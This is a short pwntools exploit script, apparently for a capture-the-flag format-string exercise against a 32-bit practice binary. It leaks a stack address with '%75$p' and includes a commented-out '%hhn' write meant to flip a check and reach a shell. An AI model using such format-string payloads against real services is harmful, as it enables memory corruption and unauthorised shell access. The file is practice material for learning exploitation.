'''
@Author       : 白银
@Date         : 2023-02-04 09:58:15
@LastEditors  : 白银
@LastEditTime : 2023-02-09 09:13:39
@FilePath     : /pwn/fmt_str_level_1_x86.py
@Description  : 不写了
@Attention    : 
@Copyright (c) 2023 by 白银 captain-jparrow@qq.com, All Rights Reserved. 
'''
from pwn import *

set_arch = 2

if set_arch == 0:
    context(log_level='debug', arch='amd64', os='linux')
elif set_arch == 1:
    context(log_level='debug', arch='arm64', os='linux')
elif set_arch == 2:
    context(log_level='debug', arch='i386', os='linux')

pwnfile = './fmt_str_level_1_x86'
state = 0  # 0为远程

if state == 0:
    io = remote("192.168.61.139", 8888)
    # io = remote("129.226.211.132", 8888)
else:
    io = process(pwnfile)

    # 本地用
    elf = ELF(pwnfile)
    rop = ROP(pwnfile)

    # 本地调试用
    gdb.attach(io)
    pause()

io.recvuntil('puts\n')
payload_search_main = b'%75$p'
io.send(payload_search_main)

main_30 = int(io.recv()[2:10], 16)# debug返回的0xf bytes，截取0x之后\n之前
main_addr = main_30 - 30

# test3_addr = stack_1 - 0x20 #源码中，是if(test3==100) system("/bin/sh")，所以比较test3的地址
# # print("stack is: ", hex(stack_1))
# payload = p32(test3_addr) + b'%96c%14$hhn'
# io.send(payload)

# # if state == 0:
# #     io.sendline(payload)  # 远程用
# # else:
# #     io.sendlineafter(payload)  # 本地用

# io.interactive()